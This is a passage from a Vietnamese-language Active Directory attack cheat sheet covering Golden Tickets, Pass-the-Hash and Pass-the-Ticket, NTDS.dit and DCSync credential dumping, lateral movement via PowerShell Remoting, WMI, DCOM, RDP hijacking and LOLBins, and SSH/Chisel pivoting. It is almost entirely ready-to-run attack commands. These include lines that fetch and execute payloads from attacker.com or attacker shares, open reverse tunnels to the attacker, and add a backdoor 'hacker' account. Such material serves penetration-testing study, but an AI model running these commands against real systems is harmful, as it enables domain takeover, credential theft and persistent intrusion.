sqlcmd -S sqlserver.corp.local -Q "SELECT @@VERSION"
```

## 6.4. Golden Ticket

Golden Ticket là một phiên bản mạnh hơn của Silver Ticket, sử dụng KRBTGT hash để tạo ra TGT (Ticket Granting Ticket) hợp lệ. Điều này cho phép truy cập vào tất cả tài nguyên trong domain.

### Cách tạo Golden Ticket với Mimikatz:

```powershell
# Lấy KRBTGT hash
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# Tạo Golden Ticket
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:krbtgt_hash /user:fake_admin /id:500 /ptt

# Thêm groups
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:krbtgt_hash /user:fake_admin /id:500 /groups:512,513,518,519,520 /ptt
```

### Tùy chọn thêm:

```powershell
# Thiết lập thời gian sống dài hơn (10 năm)
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:krbtgt_hash /user:fake_admin /id:500 /ptt /ticket:fake_admin.kirbi /endin:87600 /renewmax:262800

# Chỉ định domain controllers
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:krbtgt_hash /user:fake_admin /id:500 /ptt /sids:S-1-5-21-<enterprise-domain>-519
```

### Sử dụng Impacket để tạo Golden Ticket:

```bash
# Sử dụng ticketer.py
impacket-ticketer -nthash krbtgt_hash -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local -user-id 500 fake_admin

# Sử dụng ticket
export KRB5CCNAME=fake_admin.ccache
impacket-psexec -k -no-pass domain-controller.corp.local
```

### Sử dụng Golden Ticket:

```powershell
# DCSync với Golden Ticket
mimikatz # lsadump::dcsync /domain:corp.local /user:administrator /ptt

# Sử dụng DCSync để lấy thêm thông tin đăng nhập
lsadump::dcsync /domain:corp.local /user:sqlservice
```

## 6.5. Pass-the-Hash

Pass-the-Hash (PtH) cho phép kẻ tấn công xác thực bằng cách sử dụng hash NT của người dùng mà không cần biết mật khẩu gốc. Kỹ thuật này hoạt động với NTLM authentication.

### Sử dụng PtH với Mimikatz:

```powershell
# Thực hiện Pass-the-Hash
mimikatz # sekurlsa::pth /user:administrator /domain:corp.local /ntlm:a23456789abcdef1234567890abcdef1 /run:cmd.exe

# Với thuật toán AES
mimikatz # sekurlsa::pth /user:administrator /domain:corp.local /aes256:a23456789abcdef1234567890abcdef1a23456789abcdef1234567890abcdef1 /run:cmd.exe
```

### Sử dụng PtH với Impacket:

```bash
# PSExec với hash
impacket-psexec -hashes :a23456789abcdef1234567890abcdef1 corp.local/administrator@192.168.1.10

# WMIExec với hash
impacket-wmiexec -hashes :a23456789abcdef1234567890abcdef1 corp.local/administrator@192.168.1.10

# SMBExec với hash
impacket-smbexec -hashes :a23456789abcdef1234567890abcdef1 corp.local/administrator@192.168.1.10
```

### Sử dụng PtH với CrackMapExec:

```bash
# Kiểm tra truy cập
crackmapexec smb 192.168.1.0/24 -u administrator -H a23456789abcdef1234567890abcdef1

# Thực thi lệnh
crackmapexec smb 192.168.1.10 -u administrator -H a23456789abcdef1234567890abcdef1 -x "whoami"

# Dump SAM
crackmapexec smb 192.168.1.10 -u administrator -H a23456789abcdef1234567890abcdef1 --sam
```

### Sử dụng PtH với Evil-WinRM:

```bash
# Kết nối qua WinRM
evil-winrm -i 192.168.1.10 -u administrator -H a23456789abcdef1234567890abcdef1
```

## 6.6. Pass-the-Ticket

Pass-the-Ticket (PtT) cho phép kẻ tấn công sử dụng lại Kerberos tickets để xác thực với các dịch vụ khác nhau.

### Trích xuất tickets với Mimikatz:

```powershell
# Liệt kê tickets
mimikatz # sekurlsa::tickets

# Xuất tất cả tickets
mimikatz # sekurlsa::tickets /export

# Export một ticket cụ thể
mimikatz # kerberos::list /export
```

### Inject Kerberos tickets:

```powershell
# Import và inject ticket vào phiên hiện tại
mimikatz # kerberos::ptt ticket.kirbi
```

### Sử dụng Rubeus:

```powershell
# Liệt kê tickets
.\Rubeus.exe triage

# Dump tickets
.\Rubeus.exe dump

# Extract tickets từ LSASS process
.\Rubeus.exe dump /service:krbtgt /nowrap

# Inject ticket
.\Rubeus.exe ptt /ticket:ticket.kirbi
```

### Sử dụng tickets từ Linux:

```bash
# Thiết lập môi trường KRB5CCNAME
export KRB5CCNAME=ticket.ccache

# Sử dụng ticket với Impacket
impacket-psexec -k -no-pass target.corp.local
```

## 6.7. Overpass-the-Hash

Overpass-the-Hash (OPtH) là kỹ thuật chuyển đổi từ NTLM hash sang Kerberos ticket, kết hợp Pass-the-Hash và Pass-the-Ticket để có trải nghiệm xác thực linh hoạt hơn.

### Thực hiện Overpass-the-Hash với Mimikatz:

```powershell
# Chuyển NTLM hash thành Kerberos ticket
mimikatz # sekurlsa::pth /user:administrator /domain:corp.local /ntlm:a23456789abcdef1234567890abcdef1 /run:powershell.exe

# Trong PowerShell mới, lấy TGT
PS> klist purge
PS> net use \\dc01.corp.local\C$
```

### Sử dụng Rubeus:

```powershell
# Yêu cầu TGT với NTLM hash
.\Rubeus.exe asktgt /user:administrator /domain:corp.local /ntlm:a23456789abcdef1234567890abcdef1 /ptt

# Với AES key
.\Rubeus.exe asktgt /user:administrator /domain:corp.local /aes256:a23456789abcdef1234567890abcdef1a23456789abcdef1234567890abcdef1 /ptt
```

## 6.8. NTDS.dit Extraction

NTDS.dit là database chứa tất cả thông tin xác thực của domain, bao gồm hash passwords của tất cả user accounts. Khai thác file này là mục tiêu chính trong việc tấn công Active Directory.

### Sử dụng DCSync:

```powershell
# Mimikatz DCSync
mimikatz # lsadump::dcsync /domain:corp.local /all
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```

### Trích xuất NTDS.dit với Ntdsutil:

```cmd
# Tạo snapshot
ntdsutil "activate instance ntds" "ifm" "create full c:\temp" quit quit

# Shadow copy
ntdsutil snapshot "activate instance ntds" snapshot create quit quit
ntdsutil snapshot "mount {GUID}" quit quit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
```

### Sử dụng Impacket để trích xuất hash:

```bash
# Sử dụng secretsdump.py
impacket-secretsdump -system SYSTEM -ntds NTDS.dit LOCAL
impacket-secretsdump -dc-ip 192.168.1.10 corp.local/administrator:password@192.168.1.10
```

# 7. Lateral Movement in AD

Lateral Movement (Di chuyển ngang) trong môi trường Active Directory là quá trình di chuyển giữa các máy tính trong mạng sau khi đã có được quyền truy cập ban đầu. Đây là bước quan trọng trong quá trình tấn công chuỗi để mở rộng phạm vi kiểm soát và tiến tới các tài nguyên có giá trị cao hơn như Domain Controller.

## 7.1. PowerShell Remoting

PowerShell Remoting là một cơ chế cho phép thực thi PowerShell từ xa trên các hệ thống Windows. Đây là phương thức lateral movement mạnh mẽ, khó phát hiện và được Microsoft hỗ trợ chính thức.

### Kích hoạt PowerShell Remoting

```powershell
# Kích hoạt PowerShell Remoting trên máy mục tiêu (yêu cầu quyền admin)
Enable-PSRemoting -Force
```

### Sử dụng PowerShell Remoting với thông tin xác thực

```powershell
# Tạo PSSession
$username = "domain\username"
$password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)
$session = New-PSSession -ComputerName target-server.domain.local -Credential $cred

# Thực thi lệnh trên PSSession
Invoke-Command -Session $session -ScriptBlock { whoami; hostname; ipconfig }

# Tải và thực thi script
Invoke-Command -Session $session -FilePath C:\scripts\Invoke-Mimikatz.ps1

# Truy cập tương tác với PSSession
Enter-PSSession -Session $session

# Đóng PSSession
Remove-PSSession -Session $session
```

### One-liners (Thực thi một lần)

```powershell
# Thực thi lệnh từ xa trên một máy
Invoke-Command -ComputerName target-server.domain.local -Credential $cred -ScriptBlock { whoami; Get-Process }

# Thực thi lệnh từ xa trên nhiều máy
Invoke-Command -ComputerName (Get-Content .\servers.txt) -Credential $cred -ScriptBlock { Get-Service | Where-Object {$_.Status -eq "Running"} }

# Tải và thực thi script từ Internet trong bộ nhớ
Invoke-Command -ComputerName target-server.domain.local -Credential $cred -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1') }
```

### Sử dụng PowerShell Remoting qua SSL

```powershell
# Sử dụng HTTPS
New-PSSession -ComputerName target-server.domain.local -Credential $cred -UseSSL

# Bỏ qua kiểm tra certificate
$SessionOption = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
New-PSSession -ComputerName target-server.domain.local -Credential $cred -UseSSL -SessionOption $SessionOption
```

### Sử dụng PowerShell Remoting với Double-Hop

```powershell
# Giải quyết vấn đề "Double-Hop" với CredSSP
Enable-WSManCredSSP -Role Client -DelegateComputer target-server.domain.local -Force
Invoke-Command -ComputerName target-server.domain.local -Credential $cred -Authentication CredSSP -ScriptBlock { ... }

# Hoặc sử dụng PowerShell Remoting lồng nhau
Invoke-Command -ComputerName server1 -Credential $cred -ScriptBlock {
    $cred2 = Get-Credential
    Invoke-Command -ComputerName server2 -Credential $cred2 -ScriptBlock { ... }
}
```

## 7.2. WMI & WinRM

### Windows Management Instrumentation (WMI)

WMI là công nghệ quản lý cốt lõi trong Windows, cho phép truy vấn và thay đổi cài đặt hệ thống từ xa.

```powershell
# Thực thi lệnh với WMI
$username = "domain\username"
$password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\Windows\Temp\out.txt" -ComputerName target-server.domain.local -Credential $cred

# Lấy thông tin hệ thống từ xa
Get-WmiObject -Class Win32_OperatingSystem -ComputerName target-server.domain.local -Credential $cred

# Lấy danh sách process
Get-WmiObject -Class Win32_Process -ComputerName target-server.domain.local -Credential $cred

# Kiểm tra dịch vụ
Get-WmiObject -Class Win32_Service -ComputerName target-server.domain.local -Credential $cred | Where-Object { $_.StartMode -eq "Auto" -and $_.State -eq "Running" }
```

### Sử dụng WMI với CIM

```powershell
# Tạo CIMSession
$session = New-CimSession -ComputerName target-server.domain.local -Credential $cred

# Thực thi lệnh với CIM
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "cmd.exe /c whoami > C:\out.txt"}

# Lấy thông tin hệ thống
Get-CimInstance -CimSession $session -ClassName Win32_OperatingSystem

# Đóng session
Remove-CimSession -CimSession $session
```

### Windows Remote Management (WinRM)

WinRM là dịch vụ cho phép quản lý từ xa bằng WMI và PowerShell. Đây chính là nền tảng cho PowerShell Remoting.

```bash
# Sử dụng Evil-WinRM từ Linux
evil-winrm -i target-server.domain.local -u username -p 'Password123!'

# Sử dụng với NTLM hash (Pass-the-Hash)
evil-winrm -i target-server.domain.local -u username -H 'aad3b435b51404eeaad3b435b51404ee:a23456789abcdef1234567890abcdef1'
```

### Tạo đường hầm WMI/WinRM với Chisel

```bash
# Trên máy attacker (Linux)
./chisel server -p 8080 --reverse

# Trên máy compromised (Windows)
.\chisel.exe client attacker.com:8080 R:5985:target-server.domain.local:5985

# Kết nối qua đường hầm
evil-winrm -i 127.0.0.1 -u username -p 'Password123!'
```

## 7.3. DCOM

Distributed Component Object Model (DCOM) là một cơ chế cho phép các ứng dụng giao tiếp qua mạng. DCOM cung cấp nhiều cách để thực thi mã từ xa.

### Sử dụng DCOM để thực thi mã từ xa

```powershell
# Thiết lập các thông tin kết nối
$target = "target-server.domain.local"
$username = "domain\username"
$password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)

# Tạo đối tượng WMI sử dụng DCOM
$options = New-Object System.Management.ConnectionOptions
$options.Username = $username
$options.Password = $password
$connection = New-Object System.Management.ManagementScope("\\$target\root\cimv2", $options)
$connection.Connect()
```

### DCOM qua Microsoft Office

```powershell
# Thực thi mã thông qua Excel.Application
$com = [Activator]::CreateInstance([Type]::GetTypeFromProgID("Excel.Application", $target))
$com.Visible = $false
$com.DisplayAlerts = $false
$wb = $com.Workbooks.Add()
$com.Run("EXEC", "cmd.exe /c calc.exe")
$com.Quit()
```

### DCOM qua MMC Application

```powershell
# Thực thi lệnh thông qua MMC20.Application
$com = [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application", $target))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "7")
```

### Sử dụng ShellWindows để thực thi lệnh

```powershell
# Thực thi lệnh thông qua ShellWindows
$com = [Activator]::CreateInstance([Type]::GetTypeFromProgID("Shell.Application", $target))
$com.ShellExecute("cmd.exe", "/c calc.exe", "", "", 0)
```

### Thực thi với ShellBrowserWindow

```powershell
# Thực thi lệnh thông qua ShellBrowserWindow
$com = [Activator]::CreateInstance([Type]::GetTypeFromProgID("Shell.Explorer", $target))
$com.Navigate("c:\windows\system32\calc.exe")
```

## 7.4. RDP Techniques

Remote Desktop Protocol (RDP) là giao thức phổ biến để truy cập và điều khiển từ xa các hệ thống Windows.

### Kết nối RDP cơ bản

```powershell
# Kết nối từ PowerShell
cmdkey /generic:target-server.domain.local /user:domain\username /pass:Password123!
mstsc /v:target-server.domain.local

# Kết nối với tùy chọn bổ sung
mstsc /v:target-server.domain.local /f /admin
```

### Truy cập RDP thông qua Xfreerdp

```bash
# Kết nối từ Linux
xfreerdp /u:username /p:Password123! /v:target-server.domain.local

# Kết nối với Pass-the-Hash (NTLM)
xfreerdp /u:username /pth:a23456789abcdef1234567890abcdef1 /v:target-server.domain.local

# Tùy chọn bổ sung (chuyển clipboard, âm thanh, v.v.)
xfreerdp /u:username /p:Password123! /v:target-server.domain.local /clipboard /audio-mode:1 /dynamic-resolution
```

### RDP Session Hijacking

```powershell
# Liệt kê phiên RDP đang hoạt động
query user /server:target-server.domain.local

# Chiếm phiên với ID 2 (yêu cầu quyền SYSTEM hoặc Admin cục bộ)
tscon 2 /dest:rdp-tcp#0
```

### RDP Gateway và Tunnel

```bash
# Sử dụng SSH để tạo tunnel đến cổng RDP
ssh -L 33389:target-server.domain.local:3389 username@pivot-server

# Kết nối với tunnel cục bộ
mstsc /v:localhost:33389
```

### Restricted Admin Mode (có thể sử dụng Pass-the-Hash)

```powershell
# Kích hoạt Restricted Admin Mode
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0x0 /f

# Kết nối với /RestrictedAdmin switch
mstsc /v:target-server.domain.local /restrictedAdmin
```

## 7.5. Token Manipulation

Token Manipulation là kỹ thuật thao tác với các access token trên Windows để mạo danh người dùng khác hoặc lấy đặc quyền cao hơn.

### Sử dụng Incognito trong Meterpreter

```
# Trong phiên Meterpreter
load incognito
list_tokens -u
impersonate_token DOMAIN\\username
getuid

# Thực thi lệnh với token
execute -f cmd.exe -i -t
```

### Thao tác Token với PowerShell

```powershell
# Invoke-TokenManipulation từ PowerSploit
Import-Module .\Invoke-TokenManipulation.ps1
Invoke-TokenManipulation -ShowAll
Invoke-TokenManipulation -ImpersonateUser -Username "domain\username"
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "domain\username"
```

### Sử dụng RunasCs

```powershell
# Tạo token mới và thực thi lệnh
.\RunasCs.exe username password cmd.exe

# Sử dụng pass-the-hash
.\RunasCs.exe username --ntlm a23456789abcdef1234567890abcdef1 cmd.exe
```

### Thao tác Token trong Mimikatz

```powershell
# Token impersonation với Mimikatz
privilege::debug
token::elevate
token::list
token::impersonate /id:1234
```

### Token Duplication với Cobalt Strike

```
# Trong phiên Beacon
steal_token 1234
getuid
rev2self
```

## 7.6. Pass-the-Hash/Pass-the-Ticket

Kỹ thuật Pass-the-X (Hash/Ticket) là phương pháp xác thực bằng cách sử dụng hash NTLM hoặc Kerberos tickets mà không cần biết mật khẩu gốc.

### Pass-the-Hash với PsExec

```bash
# Sử dụng Impacket PsExec
impacket-psexec -hashes :a23456789abcdef1234567890abcdef1 domain/username@target-server.domain.local

# Sử dụng với WMIExec
impacket-wmiexec -hashes :a23456789abcdef1234567890abcdef1 domain/username@target-server.domain.local
```

### Pass-the-Hash với CrackMapExec

```bash
# Thực hiện PTH trên nhiều hosts
crackmapexec smb 192.168.1.0/24 -u username -H a23456789abcdef1234567890abcdef1

# Thực thi lệnh
crackmapexec smb target-server.domain.local -u username -H a23456789abcdef1234567890abcdef1 -x "whoami"

# Lấy shell
crackmapexec smb target-server.domain.local -u username -H a23456789abcdef1234567890abcdef1 -X "powershell -enc BASE64_ENCODED_PAYLOAD"
```

### Pass-the-Ticket với Mimikatz

```powershell
# Xuất tất cả tickets
mimikatz # sekurlsa::tickets /export

# Inject ticket vào phiên hiện tại
mimikatz # kerberos::ptt ticket.kirbi
```

### Pass-the-Ticket với Rubeus

```powershell
# Trích xuất và inject ticket
.\Rubeus.exe dump /nowrap
.\Rubeus.exe ptt /ticket:doIFuj...

# Pass-the-Ticket từ một ứng dụng cụ thể
.\Rubeus.exe dump /service:krbtgt /nowrap
```

### Overpass-the-Hash (Tạo ticket từ hash)

```powershell
# Sử dụng Mimikatz
mimikatz # sekurlsa::pth /user:username /domain:domain.local /ntlm:a23456789abcdef1234567890abcdef1 /run:powershell.exe

# Sử dụng Rubeus
.\Rubeus.exe asktgt /user:username /domain:domain.local /ntlm:a23456789abcdef1234567890abcdef1 /ptt
```

## 7.7. SCM and Service Exploits

Service Control Manager (SCM) là cơ chế quản lý và điều khiển các dịch vụ Windows, có thể được sử dụng cho lateral movement.

### Tạo và điều khiển dịch vụ từ xa

```powershell
# Tạo dịch vụ từ xa
sc \\target-server.domain.local create TestService binPath= "cmd.exe /c powershell.exe -enc BASE64_ENCODED_PAYLOAD"
sc \\target-server.domain.local start TestService

# Xóa dịch vụ sau khi sử dụng
sc \\target-server.domain.local stop TestService
sc \\target-server.domain.local delete TestService
```

### Sử dụng PsExec chính hãng

```cmd
# Thực thi lệnh từ xa
PsExec.exe \\target-server.domain.local -u domain\username -p Password123! cmd.exe

# Thực thi dưới quyền SYSTEM
PsExec.exe \\target-server.domain.local -u domain\username -p Password123! -s cmd.exe

# Tương tác với desktop
PsExec.exe \\target-server.domain.local -u domain\username -p Password123! -i cmd.exe
```

### Khai thác dịch vụ với DCOM và WMI

```powershell
# Khai thác DCOM
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "target-server.domain.local"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c powershell.exe -enc BASE64_ENCODED_PAYLOAD", "7")

# Khai thác WMI
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -enc BASE64_ENCODED_PAYLOAD" -ComputerName target-server.domain.local -Credential $cred
```

### Tạo dịch vụ với Windows API

```powershell
# Sử dụng PowerShell wrapped Win32 API
$ServiceManager = [Activator]::CreateInstance([Type]::GetTypeFromProgID("Microsoft.Update.AgentInfo", "target-server.domain.local"))
$ServiceManager.GetInfo("net user hacker P@ssw0rd123 /add")
```

## 7.8. Windows File Shares

Chia sẻ tệp Windows là một trong những phương thức truyền thống nhất để di chuyển tệp và thực thi mã từ xa.

### Liệt kê và truy cập chia sẻ

```powershell
# Liệt kê các chia sẻ có sẵn
net view \\target-server.domain.local

# Liệt kê các chia sẻ ẩn
nmap -p445 --script=smb-enum-shares target-server.domain.local

# Truy cập chia sẻ
net use Z: \\target-server.domain.local\C$ /user:domain\username Password123!
```

### Truy cập chia sẻ với PowerShell

```powershell
# Truy cập chia sẻ
New-PSDrive -Name Z -PSProvider FileSystem -Root \\target-server.domain.local\C$ -Credential $cred

# Liệt kê các tệp
Get-ChildItem -Path Z:\

# Sao chép tệp
Copy-Item -Path C:\payload.exe -Destination Z:\Windows\Temp\
```

### Thực thi mã thông qua SMB

```powershell
# Thực thi từ chia sẻ
wmic /node:target-server.domain.local process call create "\\attacker-server\share\payload.exe"

# Sử dụng SCM để thực thi từ chia sẻ
sc \\target-server.domain.local create TestService binPath= "\\attacker-server\share\payload.exe"
sc \\target-server.domain.local start TestService
```

### Sử dụng CrackMapExec với SMB

```bash
# Xác thực với SMB
crackmapexec smb target-server.domain.local -u username -p 'Password123!'

# Xác thực với PTH
crackmapexec smb target-server.domain.local -u username -H a23456789abcdef1234567890abcdef1

# Sao chép tệp
crackmapexec smb target-server.domain.local -u username -p 'Password123!' -M smbserver -o SERVER=attacker-server SHARE=share
```

## 7.9. Kerberos Delegation Attacks

Kerberos Delegation là cơ chế cho phép các dịch vụ xác thực và hành động thay mặt người dùng. Tuy nhiên, cấu hình sai có thể bị khai thác cho lateral movement.

### Unconstrained Delegation

```powershell
# Tìm máy tính với Unconstrained Delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# Tìm tài khoản người dùng với Unconstrained Delegation
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
```

### Khai thác Unconstrained Delegation với Rubeus

```powershell
# Monitor tickets
.\Rubeus.exe monitor /interval:10 /nowrap

# Khi có ticket krbtgt được ghi lại, inject và sử dụng để thực hiện DCSync
.\Rubeus.exe ptt /ticket:doIFuj...
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
```

### Constrained Delegation

```powershell
# Tìm tài khoản với Constrained Delegation
Get-ADObject -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo
```

### Khai thác Constrained Delegation với Rubeus

```powershell
# Sử dụng S4U2Self và S4U2Proxy để giả mạo ticket
.\Rubeus.exe s4u /user:webservice /rc4:a23456789abcdef1234567890abcdef1 /impersonateuser:administrator /msdsspn:cifs/target-server.domain.local /ptt

# Sử dụng ticket để truy cập
dir \\target-server.domain.local\C$
```

### Resource-Based Constrained Delegation (RBCD)

```powershell
# Kiểm tra phân quyền và cấu hình RBCD
Get-ADComputer -Identity target-server -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

# Cấu hình RBCD để khai thác
$targetComputer = Get-ADComputer -Identity target-server
$controlledComputer = Get-ADComputer -Identity controlled-server
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($controlledComputer.SID))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-ADComputer -Identity $targetComputer -Replace @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}
```

## 7.10. Remote Command Execution via LOLBins

LOLBins (Living Off The Land Binaries) là các binary hợp pháp của Windows có thể bị lạm dụng để thực thi mã từ xa và tránh phát hiện.

### Sử dụng WMIC để thực thi lệnh từ xa

```powershell
# Thực thi lệnh trên máy từ xa
wmic /node:target-server.domain.local /user:domain\username /password:Password123! process call create "cmd.exe /c whoami > C:\temp\result.txt"

# Thực thi từ file
wmic /node:target-server.domain.local /user:domain\username /password:Password123! process call create "powershell.exe -ExecutionPolicy Bypass -File C:\temp\script.ps1"
```

### Sử dụng MSHTA

```powershell
# Thực thi từ xa
wmic /node:target-server.domain.local /user:domain\username /password:Password123! process call create "mshta.exe http://attacker.com/payload.hta"
```

### Sử dụng Regsvr32

```powershell
# Thực thi từ xa
wmic /node:target-server.domain.local /user:domain\username /password:Password123! process call create "regsvr32.exe /s /u /i:http://attacker.com/payload.sct scrobj.dll"
```

### Sử dụng Rundll32

```powershell
# Thực thi DLL từ xa
wmic /node:target-server.domain.local /user:domain\username /password:Password123! process call create "rundll32.exe \\attacker-server\share\payload.dll,EntryPoint"
```

### Sử dụng odbcconf.exe

```powershell
# Tải và thực thi DLL từ xa
wmic /node:target-server.domain.local /user:domain\username /password:Password123! process call create "odbcconf.exe /a {regsvr \\attacker-server\share\payload.dll}"
```

### Sử dụng certutil.exe

```powershell
# Tải tệp từ xa
wmic /node:target-server.domain.local /user:domain\username /password:Password123! process call create "certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\temp\payload.exe"
```

---

Phần 7:

# 8. Network Pivoting & Tunneling

Pivoting và tunneling là các kỹ thuật cho phép kẻ tấn công mở rộng truy cập từ một máy đã bị xâm nhập sang các hệ thống khác trong mạng nội bộ. Những kỹ thuật này đặc biệt quan trọng trong các tình huống kiểm thử thâm nhập khi cần vượt qua tường lửa, NAT, và các cơ chế bảo vệ khác.

## 8.1. SSH Tunneling

SSH Tunneling là một trong những kỹ thuật tunneling phổ biến và linh hoạt nhất, sử dụng giao thức SSH để tạo các kênh truyền dữ liệu bảo mật.

### 8.1.1. Local Port Forwarding

Local port forwarding cho phép chuyển tiếp lưu lượng từ cổng cục bộ trên máy tấn công đến máy đích thông qua một máy trung gian.

```bash
# Cú pháp cơ bản
ssh -L [local_port]:target_host:target_port username@pivot_host

# Ví dụ: Truy cập web server (10.10.10.5:80) qua pivot host (192.168.1.5)
ssh -L 8080:10.10.10.5:80 user@192.168.1.5

# Sau khi kết nối, truy cập http://localhost:8080 từ máy tấn công sẽ truy cập đến 10.10.10.5:80

# Nếu lưu vào file config
cat << EOF >> ~/.ssh/config
Host pivot
    HostName 192.168.1.5
    User user
    LocalForward 8080 10.10.10.5:80
EOF

# Sử dụng nhiều tunnels cùng lúc
ssh -L 8080:10.10.10.5:80 -L 8443:10.10.10.5:443 -L 3306:10.10.10.6:3306 user@192.168.1.5
```

### 8.1.2. Remote Port Forwarding

Remote port forwarding làm ngược lại so với local forwarding, cho phép chuyển tiếp lưu lượng từ cổng trên máy pivot đến máy tấn công.

```bash
# Cú pháp cơ bản
ssh -R [remote_port]:target_host:target_port username@attacking_host

# Ví dụ: Mở shell trên máy nạn nhân và chuyển tiếp đến máy tấn công
# Trên máy pivot
ssh -R 8000:localhost:80 user@attacker-ip

# Sử dụng từ máy khác trong mạng nội bộ
ssh -R 8000:10.10.10.5:80 user@attacker-ip

# Cho phép truy cập từ các interfaces khác (cần cấu hình GatewayPorts yes trong /etc/ssh/sshd_config)
ssh -R 0.0.0.0:8000:localhost:80 user@attacker-ip
```

### 8.1.3. Dynamic Port Forwarding (SOCKS Proxy)

Dynamic port forwarding thiết lập một proxy SOCKS, cho phép chuyển tiếp lưu lượng đến nhiều đích khác nhau thông qua một cổng cục bộ.

```bash
# Cú pháp cơ bản
ssh -D [local_port] username@pivot_host

# Ví dụ: Tạo SOCKS proxy trên cổng 9050
ssh -D 9050 user@192.168.1.5

# Cấu hình proxychains để sử dụng với các công cụ khác
echo "socks5 127.0.0.1 9050" >> /etc/proxychains.conf

# Sử dụng proxychains để thực hiện Nmap scan
proxychains nmap -sT -Pn 10.10.10.5

# Sử dụng proxychains với metasploit
proxychains msfconsole

# Cấu hình trình duyệt để sử dụng SOCKS proxy
# Firefox: Preferences > Network Settings > Manual proxy configuration
# SOCKS Host: 127.0.0.1, Port: 9050, SOCKS v5
```

### 8.1.4. Jump Hosts và Agent Forwarding

Kỹ thuật này cho phép kết nối qua nhiều máy trung gian và sử dụng khóa SSH mà không cần sao chép chúng.

```bash
# Sử dụng ProxyJump (SSH 7.3+)
ssh -J user1@pivot1.example.com user2@pivot2.example.com

# Sử dụng nhiều jump hosts
ssh -J user1@pivot1.example.com,user2@pivot2.example.com user3@target.example.com

# Sử dụng ssh agent forwarding
ssh-add ~/.ssh/id_rsa
ssh -A user@pivot-host
# Sau khi kết nối đến pivot, bạn có thể SSH đến các hosts khác mà không cần password
```

### 8.1.5. Kỹ thuật SSH Tunneling Nâng cao

```bash
# Port forwarding với autossh (tự động kết nối lại nếu bị ngắt)
autossh -M 0 -N -L 8080:10.10.10.5:80 user@192.168.1.5

# Tạo tunnel background (-f) và không thực thi lệnh (-N)
ssh -f -N -L 8080:10.10.10.5:80 user@192.168.1.5

# Chuyển tiếp X11 để chạy GUI applications
ssh -X user@pivot-host

# Tạo reverse SOCKS proxy khi bạn kiểm soát máy nạn nhân
# Trên máy nạn nhân
ssh -f -N -R 9050 user@attacker-ip
```

## 8.2. SOCKS Proxies

SOCKS proxies cho phép chuyển tiếp lưu lượng TCP/UDP qua một máy trung gian và thường được sử dụng với các công cụ như proxychains.

### 8.2.1. Cấu hình và Sử dụng Proxychains

```bash
# Cài đặt proxychains
apt-get install proxychains

# Cấu hình proxychains
cat > /etc/proxychains.conf << EOF
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
# add proxy here ...
# format: type  host  port [user pass]
socks5 127.0.0.1 9050
EOF

# Sử dụng proxychains với các công cụ khác
proxychains nmap -sT -Pn 10.10.10.5
proxychains curl http://10.10.10.5
proxychains firefox

# Chuỗi proxychains
echo "socks5 192.168.1.5 9050" >> /etc/proxychains.conf
# Bây giờ traffic sẽ đi qua cả hai proxy
```

### 8.2.2. Tạo SOCKS Proxy với Công cụ Khác

```bash
# Tạo SOCKS proxy với Metasploit
use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 9050
run

# Tạo SOCKS proxy với chisel
# Trên máy attacker
./chisel server -p 8080 --reverse
# Trên máy pivot
./chisel client attacker-ip:8080 R:9050:socks

# Tạo SOCKS proxy với socat
# Thay thế không hoàn toàn nhưng có thể chuyển tiếp port cụ thể
socat TCP-LISTEN:8080,fork TCP:target-host:80
```

## 8.3. Chisel Usage

Chisel là công cụ tunneling hiện đại, hỗ trợ HTTP tunneling và SOCKS proxies, rất hữu ích khi SSH không khả dụng.

### 8.3.1. Cài đặt Chisel

```bash
# Tải và cài đặt trên Linux
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gunzip chisel_1.7.7_linux_amd64.gz
